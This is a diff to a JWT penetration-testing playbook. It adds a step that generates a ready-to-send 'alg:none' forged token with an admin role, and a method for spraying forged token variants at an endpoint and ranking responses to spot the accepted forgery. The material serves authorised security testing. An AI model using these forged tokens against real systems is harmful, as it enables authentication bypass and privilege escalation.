@@ -30,6 +30,18 @@ origin: AI Threat Hunting
 - [ ] Base64url-decode payload → check `sub`, `role`, `admin`, `exp`, `iat`, `iss`
 - [ ] Note expiration time — is it enforced?
 - [ ] Collect multiple tokens — compare structure, observe changing fields
+- [ ] Confirm the token is recognised as a JWT and pull a deterministic first-pass variant set
+      (the `alg:none` forgery, empty/malformed signatures) before reaching for jwt_tool:
+      ```bash
+      aith assess classify-payload "$TOKEN" --mutations
+      #   type: jwt
+      #   escalation: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4iLCJzdWIiOiIxIn0.'  ← ready-to-send alg:none token (header={"alg":"none","typ":"JWT"}, payload={"role":"admin","sub":"1"})
+      #               '<header>.<payload>.AAAA'   ← original header.payload with a bogus signature
+      #   boundary:   '' 'a' (255×a)              ← empty / junk-signature variants
+      #   empty:      '' 'null' 'undefined' ' ' '\x00'
+      ```
+      These are starting probes; for full claim editing, secret cracking, and key confusion use
+      jwt_tool (the variants below).
 
 ### 2. Algorithm None Attack
 
@@ -99,6 +111,26 @@ origin: AI Threat Hunting
 - Secret recovered (if HMAC brute-force)
 - Severity: Critical (forge any user/admin token) or High (privilege escalation)
 - Remediation: strong secrets, enforce algorithm allowlist, validate all claims
+
+## Triage a Batch of Token Variants
+
+When you spray many forged tokens at one endpoint (alg-casing set, the `kid`/`jku` injection
+matrix in §6, a claim-rewrite sweep), the kill-signal is a response that *breaks from the
+rejection cluster* — a `200`, a different status, a different error body. Capture one record per
+variant (`url`, `status`, `content_length`, and `title` or `words` if the body carries the error
+text) and rank the odd-one-out instead of eyeballing every reply:
+
+```bash
+# one {url,status,content_length,title} object per token variant → jwt_variants.jsonl
+aith assess anomaly-score jwt_variants.jsonl --top 5
+#   #1  score=4.17  status=200  len=842  url=.../api/me   ← the accepted forgery
+#       ^ status='200'  ^ title='dashboard'              the rest 401'd with identical bodies
+```
+
+The top-ranked record is the variant the verifier treated differently — the accepted `alg:none`,
+the `kid` that resolved to an empty key, the claim edit that passed. The oracle surfaces
+category-level breaks (status flip, size-class jump, changed error title), so it is the fast path
+from "100 variants fired" to "this one validated"; confirm by replaying that single token.
 
 ## Kill Signals — Stop Testing When
 - alg:none accepted → CRITICAL, record immediately, stop testing other JWT vectors
